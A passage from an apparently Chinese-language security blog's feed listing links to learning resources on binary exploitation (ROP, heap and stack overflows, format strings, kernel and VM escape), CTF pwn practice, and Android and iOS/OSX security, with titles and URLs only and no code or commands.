<li><a href="https://blog.skullsecurity.org/2013/ropasaurusrex-a-primer-on-return-oriented-programming" target="_blank" rel="external">ropasaurusrex: a primer on return-oriented programming2</a></li>
<li><a href="http://bobao.360.cn/learning/detail/3569.html" target="_blank" rel="external">ROP技术入门教程</a></li>
<li><a href="https://xianzhi.aliyun.com/forum/read/840.html?fpage=2" target="_blank" rel="external">二进制漏洞利用中的ROP技术研究与实例分析</a></li>
<li><a href="http://bobao.360.cn/learning/detail/3694.html" target="_blank" rel="external">现代栈溢出利用技术基础：ROP</a></li>
<li><a href="http://wooyun.jozxing.cc/static/drops/binary-14360.html" target="_blank" rel="external">通过ELF动态装载构造ROP链</a></li>
<li><a href="http://bestwing.me/2017/03/19/stack-overflow-two-ROP/" target="_blank" rel="external">Swing: 基础栈溢出复习 二 之 ROP </a></li>
</ul>
<h3 id="BROP"><a href="#BROP" class="headerlink" title="BROP"></a>BROP</h3><ul>
<li><a href="http://www.scs.stanford.edu/brop/" target="_blank" rel="external">Blind Return Oriented Programming</a></li>
</ul>
<ul>
<li><a href="http://o0xmuhe.me/2017/01/22/Have-fun-with-Blind-ROP/" target="_blank" rel="external">muhe: Have fun with Blind ROP</a></li>
</ul>
<ul>
<li><a href="http://bestwing.me/2017/03/24/stack-overflow-four-BROP/" target="_blank" rel="external">Swing: 基础栈溢出复习 四 之 BROP </a></li>
</ul>
<h3 id="SROP"><a href="#SROP" class="headerlink" title="SROP"></a>SROP</h3><ul>
<li><a href="http://www.freebuf.com/articles/network/87447.html" target="_blank" rel="external">Sigreturn Oriented Programming (SROP) Attack攻击原理</a></li>
<li><a href="http://bestwing.me/2017/03/20/stack-overflow-three-SROP/" target="_blank" rel="external">Swing: 基础栈溢出复习 三 之 SROP </a></li>
</ul>
<h3 id="Return-to-dl-resolve"><a href="#Return-to-dl-resolve" class="headerlink" title="Return-to-dl-resolve"></a>Return-to-dl-resolve</h3><ul>
<li><a href="http://www.evil0x.com/posts/19226.html" target="_blank" rel="external">通过ELF动态装载构造ROP链 （ Return-to-dl-resolve）</a></li>
</ul>
<h2 id="栈漏洞"><a href="#栈漏洞" class="headerlink" title="栈漏洞"></a>栈漏洞</h2><ul>
<li><a href="http://bobao.360.cn/learning/detail/3717.html" target="_blank" rel="external">手把手教你栈溢出从入门到放弃（上）</a></li>
<li><a href="http://bobao.360.cn/learning/detail/3718.html" target="_blank" rel="external">手把手教你栈溢出从入门到放弃（下）</a></li>
<li><a href="http://0x48.pw/2016/11/03/0x26/" target="_blank" rel="external">Hcamael: PWN学习总结之基础栈溢出</a></li>
<li><a href="http://0x48.pw/2016/11/21/0x27/" target="_blank" rel="external">Hcamael: PWN学习总结之基础栈溢出2 </a></li>
<li><a href="http://bestwing.me/2017/03/18/stack-overflow-one/" target="_blank" rel="external">Swing: 基础栈溢出复习 之基础</a></li>
<li><a href="http://www.freebuf.com/articles/terminal/107276.html" target="_blank" rel="external">ARM栈溢出攻击实践：从虚拟环境搭建到ROP利用 </a></li>
<li><a href="https://blog.techorganic.com/2015/04/10/64-bit-linux-stack-smashing-tutorial-part-1/" target="_blank" rel="external">64-bit Linux stack smashing tutorial: Part 1</a></li>
<li><a href="https://blog.techorganic.com/2015/04/21/64-bit-linux-stack-smashing-tutorial-part-2/" target="_blank" rel="external">64-bit Linux stack smashing tutorial: Part 2</a></li>
<li><a href="https://blog.techorganic.com/2016/03/18/64-bit-linux-stack-smashing-tutorial-part-3/" target="_blank" rel="external">64-bit Linux stack smashing tutorial: Part 3</a></li>
<li><a href="http://cybersecurity.upv.es/attacks/offset2lib/offset2lib.html" target="_blank" rel="external">Offset2lib: bypassing full ASLR on 64bit Linu</a></li>
</ul>
<h2 id="堆漏洞"><a href="#堆漏洞" class="headerlink" title="堆漏洞"></a>堆漏洞</h2><ul>
<li><a href="https://heap-exploitation.dhavalkapil.com/introduction.html" target="_blank" rel="external">Heap Exploitation</a></li>
<li><a href="https://github.com/shellphish/" target="_blank" rel="external">how2heap</a></li>
</ul>
<h3 id="堆相关知识"><a href="#堆相关知识" class="headerlink" title="堆相关知识"></a>堆相关知识</h3><ul>
<li><a href="http://paper.seebug.org/255/" target="_blank" rel="external">PWN之堆内存管理</a></li>
<li><a href="http://www.freebuf.com/articles/system/104144.html" target="_blank" rel="external">Linux堆内存管理深入分析（上） </a></li>
<li><a href="http://www.freebuf.com/articles/security-management/105285.html" target="_blank" rel="external">Linux堆内存管理深入分析（下） </a></li>
<li><a href="http://bobao.360.cn/learning/detail/3548.html" target="_blank" rel="external">Windows Exploit开发系列教程——堆喷射（一）</a></li>
<li><a href="http://bobao.360.cn/learning/detail/3555.html" target="_blank" rel="external">Windows Exploit开发系列教程——堆喷射（二）</a></li>
<li><a href="http://www.freebuf.com/articles/system/91527.html" target="_blank" rel="external">Libc堆管理机制及漏洞利用技术 (一） </a></li>
<li><a href="https://blog.iret.xyz/article.aspx/linux_heapoverflow_enterance" target="_blank" rel="external">Notes About Heap Overflow Under Linux</a></li>
<li><a href="http://www.freebuf.com/vuls/98404.html" target="_blank" rel="external">如何理解堆和堆溢出漏洞的利用?</a></li>
</ul>
<ul>
<li><a href="http://o0xmuhe.me/2016/11/21/Have-fun-with-glibc%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/" target="_blank" rel="external">Have fun with glibc内存管理</a></li>
<li><a href="http://www.tuicool.com/articles/A7n2ueq" target="_blank" rel="external">内存映射mmap</a></li>
<li><a href="http://0x48.pw/2017/07/25/0x35/" target="_blank" rel="external">glibc malloc学习笔记之fastbin</a></li>
<li><a href="http://0x48.pw/2017/08/07/0x37/" target="_blank" rel="external">malloc.c源码阅读之__libc_free</a></li>
</ul>
<h3 id="堆利用技术"><a href="#堆利用技术" class="headerlink" title="堆利用技术"></a>堆利用技术</h3><ul>
<li><a href="http://wooyun.jozxing.cc/static/drops/binary-14596.html" target="_blank" rel="external">溢出科普：heap overflow&amp;溢出保护和绕过</a></li>
</ul>
<ul>
<li><a href="http://bobao.360.cn/learning/detail/3197.html" target="_blank" rel="external">现代化的堆相关漏洞利用技巧</a></li>
<li><a href="http://bobao.360.cn/learning/detail/3113.html" target="_blank" rel="external">从一字节溢出到任意代码执行-Linux下堆漏洞利用</a></li>
<li><a href="https://sploitfun.wordpress.com/2015/02/26/heap-overflow-using-unlink/?spm=a313e.7916648.0.0.x4nzYZ" target="_blank" rel="external">Heap overflow using unlink</a></li>
<li><a href="https://jaq.alibaba.com/community/art/show?spm=a313e.7916646.24000001.74.ZP8rXN&amp;articleid=360" target="_blank" rel="external">Linux堆溢出漏洞利用之unlink</a></li>
<li><a href="http://bobao.360.cn/learning/detail/3996.html" target="_blank" rel="external">Linux堆溢出之Fastbin Attack实例详解</a></li>
<li><a href="http://bobao.360.cn/learning/detail/3296.html" target="_blank" rel="external">unsorted bin attack分析</a></li>
<li><a href="http://www.vuln.cn/6172" target="_blank" rel="external">Double Free浅析</a></li>
<li><a href="http://www.blackhat.com/presentations/bh-usa-07/Ferguson/Whitepaper/bh-usa-07-ferguson-WP.pdf" target="_blank" rel="external">Understanding the heap by breaking it</a></li>
<li><a href="https://www.purehacking.com/blog/lloyd-simon/an-introduction-to-use-after-free-vulnerabilities" target="_blank" rel="external">An Introduction to Use After Free Vulnerabilities</a></li>
<li><a href="http://bobao.360.cn/learning/detail/3379.html?utm_source=tuicool&amp;utm_medium=referral" target="_blank" rel="external">Use After Free漏洞浅析</a></li>
<li><a href="http://d0m021ng.github.io/2017/03/04/PWN/Linux堆漏洞之Use-after-free实例/" target="_blank" rel="external">Linux堆漏洞之Use after free实例</a></li>
<li><a href="http://bobao.360.cn/learning/detail/3417.html" target="_blank" rel="external">堆之House of Spirit</a></li>
</ul>
<h2 id="格式化字符串漏洞"><a href="#格式化字符串漏洞" class="headerlink" title="格式化字符串漏洞"></a>格式化字符串漏洞</h2><ul>
<li><a href="https://crypto.stanford.edu/cs155old/cs155-spring08/papers/formatstring-1.2.pdf" target="_blank" rel="external">Exploiting Format String Vulnerabilities</a></li>
</ul>
<ul>
<li><a href="http://cb.drops.wiki/drops/binary-6259.html" target="_blank" rel="external">二进制漏洞之——邪恶的printf</a></li>
<li><a href="http://cb.drops.wiki/drops/papers-9426.html" target="_blank" rel="external">漏洞挖掘基础之格式化字符串</a></li>
<li><a href="http://bobao.360.cn/learning/detail/3654.html" target="_blank" rel="external">格式化字符串漏洞利用小结（一）</a></li>
<li><a href="http://bobao.360.cn/learning/detail/3674.html" target="_blank" rel="external">格式化字符串漏洞利用小结（二）</a></li>
<li><a href="http://www.cnblogs.com/Ox9A82/p/5429099.html" target="_blank" rel="external">Linux下的格式化字符串漏洞利用姿势</a></li>
</ul>
<ul>
<li><a href="http://0x48.pw/2017/03/13/0x2c/?utm_source=tuicool&amp;utm_medium=referral" target="_blank" rel="external">Linux系统下格式化字符串利用研究 </a></li>
<li><a href="http://phrack.org/issues/59/7.html" target="_blank" rel="external">Advances in format string exploitation</a></li>
<li><a href="http://www.vnsecurity.net/research/2012/02/16/exploiting-sudo-format-string-vunerability.html" target="_blank" rel="external">Exploiting Sudo format string vunerability</a></li>
</ul>
<h2 id="其余漏洞"><a href="#其余漏洞" class="headerlink" title="其余漏洞"></a>其余漏洞</h2><h3 id="FSP溢出"><a href="#FSP溢出" class="headerlink" title="FSP溢出"></a>FSP溢出</h3><ul>
<li><a href="http://wooyun.jozxing.cc/static/drops/binary-12740.html" target="_blank" rel="external">Head First FILE Stream Pointer Overflow</a></li>
<li><a href="https://outflux.net/blog/archives/2011/12/22/abusing-the-file-structure/" target="_blank" rel="external">abusing the FILE structure</a></li>
<li><a href="http://repo.thehackademy.net/depot_ouah/fsp-overflows.txt" target="_blank" rel="external">File Stream Pointer Overflows Paper.</a></li>
<li><a href="http://bobao.360.cn/learning/detail/3219.html" target="_blank" rel="external">溢出利用FILE结构体</a></li>
</ul>
<h3 id="整数溢出"><a href="#整数溢出" class="headerlink" title="整数溢出"></a>整数溢出</h3><ul>
<li><a href="http://blog.csdn.net/wuxiaobingandbob/article/details/44618925" target="_blank" rel="external">整数溢出漏洞</a></li>
</ul>
<h2 id="保护绕过"><a href="#保护绕过" class="headerlink" title="保护绕过"></a>保护绕过</h2><h3 id="Cannary绕过"><a href="#Cannary绕过" class="headerlink" title="Cannary绕过"></a>Cannary绕过</h3><ul>
<li><a href="http://0x48.pw/2017/03/14/0x2d/" target="_blank" rel="external">栈溢出之绕过CANARY保护 </a></li>
<li><a href="http://veritas501.space/2017/04/28/论canary的几种玩法/" target="_blank" rel="external">论canary的几种玩法</a></li>
<li><a href="http://yunnigu.dropsec.xyz/2017/03/20/Liunx下关于绕过cancry保护总结/" target="_blank" rel="external">Liunx下关于绕过cancry保护总结</a></li>
</ul>
<h2 id="内核"><a href="#内核" class="headerlink" title="内核"></a>内核</h2><ul>
<li><a href="https://github.com/hacksysteam/HackSysExtremeVulnerableDriver" target="_blank" rel="external">HackSysExtremeVulnerableDriver</a></li>
<li><a href="https://hshrzd.wordpress.com/2017/05/28/starting-with-windows-kernel-exploitation-part-1-setting-up-the-lab/" target="_blank" rel="external">Starting with Windows Kernel Exploitation – part 1 – setting up the lab</a></li>
<li><a href="https://hshrzd.wordpress.com/2017/06/05/starting-with-windows-kernel-exploitation-part-2/" target="_blank" rel="external">Starting with Windows Kernel Exploitation – part 2 – getting familiar with HackSys Extreme Vulnerable Driver</a></li>
<li><a href="http://bobao.360.cn/learning/detail/4002.html" target="_blank" rel="external">Windows内核利用之旅：熟悉HEVD（附视频演示）</a></li>
<li><a href="http://bobao.360.cn/learning/detail/3718.html" target="_blank" rel="external">Windows 内核攻击：栈溢出</a></li>
<li><a href="http://bobao.360.cn/learning/detail/3700.html" target="_blank" rel="external">Linux 内核漏洞利用教程（一）：环境配置</a></li>
<li><a href="http://bobao.360.cn/learning/detail/3702.html" target="_blank" rel="external">Linux 内核漏洞利用教程（二）：两个Demo</a></li>
<li><a href="http://bobao.360.cn/learning/detail/3706.html" target="_blank" rel="external">Linux 内核漏洞利用教程（三）：实践 CSAW CTF 题目</a></li>
<li><a href="http://www.freebuf.com/articles/system/94198.html" target="_blank" rel="external">Linux内核ROP姿势详解(一) </a></li>
<li><a href="http://www.freebuf.com/articles/system/135402.html" target="_blank" rel="external">Linux内核ROP姿势详解（二）</a></li>
</ul>
<h2 id="虚拟机逃逸"><a href="#虚拟机逃逸" class="headerlink" title="虚拟机逃逸"></a>虚拟机逃逸</h2><ul>
<li><a href="http://bbs.pediy.com/thread-217997.htm" target="_blank" rel="external">虚拟机逃逸——QEMU的案例分析（一）</a></li>
<li><a href="http://bbs.pediy.com/thread-217999.htm" target="_blank" rel="external">虚拟机逃逸——QEMU的案例分析（二）</a></li>
<li><a href="http://bbs.pediy.com/thread-218045.htm" target="_blank" rel="external">虚拟机逃逸——QEMU的案例分析（三） </a></li>
</ul>
<h2 id="ARM"><a href="#ARM" class="headerlink" title="ARM"></a>ARM</h2><ul>
<li><a href="http://bobao.360.cn/learning/detail/4070.html" target="_blank" rel="external">ARM 汇编基础速成1：ARM汇编以及汇编语言基础介绍</a></li>
<li><a href="http://bobao.360.cn/learning/detail/4075.html" target="_blank" rel="external">ARM 汇编基础速成2：ARM汇编中的数据类型</a></li>
<li><a href="http://bobao.360.cn/learning/detail/4082.html" target="_blank" rel="external">ARM 汇编基础速成3：ARM模式与THUMB模式</a></li>
<li><a href="http://bobao.360.cn/learning/detail/4087.html" target="_blank" rel="external">ARM 汇编基础速成4：ARM汇编内存访问相关指令</a></li>
<li><a href="http://bobao.360.cn/learning/detail/4097.html" target="_blank" rel="external">ARM 汇编基础速成5：连续存取</a></li>
<li><a href="http://bobao.360.cn/learning/detail/4104.html" target="_blank" rel="external">ARM 汇编基础速成6：条件执行与分支</a></li>
<li><a href="http://bobao.360.cn/learning/detail/4108.html" target="_blank" rel="external">ARM 汇编基础速成7：栈与函数</a></li>
</ul>
<h2 id="进程注入"><a href="#进程注入" class="headerlink" title="进程注入"></a>进程注入</h2><ul>
<li><a href="http://bobao.360.cn/learning/detail/4131.html" target="_blank" rel="external">10种常见的进程注入技术的总结</a></li>
<li><a href="http://www.freebuf.com/articles/system/143640.html" target="_blank" rel="external">系统安全攻防战：DLL注入技术详解 </a></li>
</ul>
<h2 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h2><ul>
<li><a href="http://bobao.360.cn/learning/detail/4213.html" target="_blank" rel="external">看我如何对Apache进行模糊测试并挖到了一个价值1500刀的漏洞</a></li>
</ul>
<h2 id="CTF中的pwn"><a href="#CTF中的pwn" class="headerlink" title="CTF中的pwn"></a>CTF中的pwn</h2><ul>
<li><a href="https://github.com/jmpews/pwn2exploit" target="_blank" rel="external">pwn &amp; exploit</a></li>
</ul>
<h3 id="入门"><a href="#入门" class="headerlink" title="入门"></a>入门</h3><ul>
<li><a href="http://bobao.360.cn/learning/detail/3300.html" target="_blank" rel="external">跟我入坑PWN第一章</a></li>
<li><a href="http://bobao.360.cn/learning/detail/3339.html" target="_blank" rel="external">跟我入坑PWN第二章</a></li>
</ul>
<h3 id="技巧"><a href="#技巧" class="headerlink" title="技巧"></a>技巧</h3><ul>
<li><a href="http://bobao.360.cn/learning/detail/3298.html?utm_source=tuicool&amp;utm_medium=referral" target="_blank" rel="external">借助DynELF实现无libc的漏洞利用小结</a></li>
</ul>
<ul>
<li><a href="http://o0xmuhe.me/2016/12/24/what-DynELF-does-basically/" target="_blank" rel="external">what DynELF does basically </a></li>
<li><a href="http://uaf.io/exploitation/misc/2016/04/02/Finding-Functions.html" target="_blank" rel="external">Finding Function’s Load Address </a></li>
</ul>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ul>
<li><a href="https://github.com/stfpeak/CTF" target="_blank" rel="external">CTF总结</a></li>
<li><a href="http://skysider.com/?p=223" target="_blank" rel="external">pwn tips</a></li>
<li><a href="https://github.com/Naetw/CTF-pwn-tips" target="_blank" rel="external">CTF-pwn-tips</a></li>
<li><a href="http://www.angelwhu.com/blog/?p=460" target="_blank" rel="external">pwn 学习总结</a></li>
<li><a href="http://www.cnblogs.com/Ox9A82/p/5559167.html" target="_blank" rel="external">CTF中做Linux下漏洞利用的一些心得</a></li>
<li><a href="http://drops.xmd5.com/static/drops/binary-6521.html" target="_blank" rel="external">linux常见漏洞利用技术实践</a></li>
</ul>
<h3 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h3><ul>
<li><a href="http://0x48.pw/2017/08/01/0x36/" target="_blank" rel="external">堆溢出学习之0CTF 2017 Babyheap </a></li>
</ul>
<ul>
<li><a href="http://bobao.360.cn/learning/detail/3189.html" target="_blank" rel="external">一道有趣的CTF PWN题</a></li>
<li><a href="https://github.com/1u4nx/Exploit-Exercises-Nebula" target="_blank" rel="external">Exploit-Exercises Nebula全攻略</a></li>
<li><a href="http://wooyun.jozxing.cc/static/drops/binary-16700.html" target="_blank" rel="external">三个白帽之从pwn me调试到Linux攻防学习</a></li>
</ul>
<h1 id="Android-Security"><a href="#Android-Security" class="headerlink" title="Android Security"></a>Android Security</h1><h2 id="Exercise"><a href="#Exercise" class="headerlink" title="Exercise"></a>Exercise</h2><ul>
<li><a href="https://github.com/payatu/diva-android/" target="_blank" rel="external">DIVA Android</a></li>
</ul>
<ul>
<li><a href="https://mp.weixin.qq.com/s?__biz=MzI4NjEyMDk0MA==&amp;mid=2649846643&amp;idx=1&amp;sn=0286e8f1b3e6da0acbd129cb248eac2a" target="_blank" rel="external">Android安全项目入门篇</a></li>
</ul>
<h2 id="Skill"><a href="#Skill" class="headerlink" title="Skill"></a>Skill</h2><ul>
<li><a href="https://mp.weixin.qq.com/s?__biz=MzI5MDQ2NjExOQ==&amp;mid=2247484642&amp;idx=1&amp;sn=d34ec8b6fc9b5a63b627316e13821b13&amp;chksm=ec1e34cadb69bddc80598c93a0aef429d0b1d668b4fc6e5e6b31a7a3ebfa713aafda1f1b8f7a&amp;scene=21#wechat_redirect" target="_blank" rel="external">Android App漏洞学习（一）</a></li>
<li><a href="https://mp.weixin.qq.com/s?__biz=MzI5MDQ2NjExOQ==&amp;mid=2247484706&amp;idx=1&amp;sn=eb49d5f71f89fd4d2e3bec23c44c0ae6&amp;chksm=ec1e350adb69bc1c9f775bfaf997459e1cfa3beb065f553ed90fbd88220d7739487e9f7208bd#rd" target="_blank" rel="external">Android App漏洞学习（二） </a></li>
<li><a href="http://wiki.ioin.in/sort/android" target="_blank" rel="external">WIKI: Android</a></li>
<li><a href="https://mp.weixin.qq.com/s?__biz=MzI5MDQ2NjExOQ==&amp;mid=2247484387&amp;idx=1&amp;sn=7264428205276452d40c1ef7b1ed0dcc&amp;chksm=ec1e33cbdb69badd00794f81caa43e5d62e0dc9bb7b9baa9d4c3c9eb64a3a0a18613356bf584#rd" target="_blank" rel="external">Android组件安全</a></li>
<li><a href="https://zhuanlan.zhihu.com/p/28107901" target="_blank" rel="external">通过 WebView 攻击 Android 应用</a></li>
</ul>
<h2 id="Tool"><a href="#Tool" class="headerlink" title="Tool"></a>Tool</h2><ul>
<li><a href="http://bobao.360.cn/learning/detail/4254.html" target="_blank" rel="external">走到哪黑到哪——Android渗透测试三板斧</a></li>
<li><a href="http://www.4hou.com/penetration/6916.html" target="_blank" rel="external">Brida:将frida与burp结合进行移动app渗透测试</a></li>
</ul>
<h1 id="浏览器安全"><a href="#浏览器安全" class="headerlink" title="浏览器安全"></a>浏览器安全</h1><ul>
<li><a href="https://zhuanlan.zhihu.com/p/28719766" target="_blank" rel="external">浏览器漏洞挖掘思路</a></li>
</ul>
<h1 id="IOS-OSX-Securiy"><a href="#IOS-OSX-Securiy" class="headerlink" title="IOS/OSX Securiy"></a>IOS/OSX Securiy</h1><ul>
<li><a href="https://github.com/michalmalik/osx-re-101" target="_blank" rel="external">OSX/iOS reverse engineering</a></li>
</ul>
<h2 id="IOS"><a href="#IOS" class="headerlink" title="IOS"></a>IOS</h2><h3 id="Exercise-1"><a href="#Exercise-1" class="headerlink" title="Exercise"></a>Exercise</h3><ul>
<li><a href="http://damnvulnerableiosapp.com/#trainings" target="_blank" rel="external">Damn Vulnerable iOS Application (DVIA)</a></li>
</ul>
<h3 id="Skill-1"><a href="#Skill-1" class="headerlink" title="Skill"></a>Skill</h3><ul>
<li><a href="https://github.com/pandazheng/IosHackStudy" target="_blank" rel="external">IosHackStudy</a></li>
<li><a href="https://papers.put.as/ios/ios/" target="_blank" rel="external">Papers, Slides and Thesis Archive : iOS</a></li>
<li><a href="http://security.ios-wiki.com/" target="_blank" rel="external">ios-wiki: iOS Security</a></li>
<li><a href="https://www.apple.com/business/docs/iOS_Security_Guide.pdf" target="_blank" rel="external">apple官方文档：iOS Security</a></li>
<li><a href="http://esoftmobile.com/2014/02/14/ios-security/" target="_blank" rel="external">iOS安全系列汇总</a></li>
<li><a href="https://security.tencent.com/index.php/blog/msg/105" target="_blank" rel="external">浅谈iOS应用安全自动化审计</a></li>
<li><a href="http://www.freebuf.com/articles/terminal/123098.html" target="_blank" rel="external">iOS安全审计入门</a></li>
<li><a href="http://blog.pangu.io/xkungfoo2015/" target="_blank" rel="external">iOS内核漏洞挖掘–fuzz&amp;代码审计</a></li>
</ul>
<h2 id="OSX"><a href="#OSX" class="headerlink" title="OSX"></a>OSX</h2><h3 id="Exercise-2"><a href="#Exercise-2" class="headerlink" title="Exercise"></a>Exercise</h3><ul>
<li><a href="https://reverse.put.as/crackmes/" target="_blank" rel="external">OS X : Crackmes</a></li>
</ul>
<h3 id="Skill-2"><a href="#Skill-2" class="headerlink" title="Skill"></a>Skill</h3><ul>
<li><a href="https://papers.put.as/macosx/macosx/" target="_blank" rel="external">Papers, Slides and Thesis Archive : Mac OS X</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Software-Security-Learning 学习资料&lt;br&gt;8月24日更新小记：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;修正某些错误链接&lt;/li&gt;
&lt;li&gt;新加浏览器漏洞模块：&lt;a href=&quot;https://zhuanlan.zhihu.com/p/28719766&quot;&gt;浏览器漏洞挖掘思路&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;headerlink&quot; title=&quot;&quot;&gt;&lt;/a&gt;
    
    </summary>
    
    
  </entry>
  
</feed>
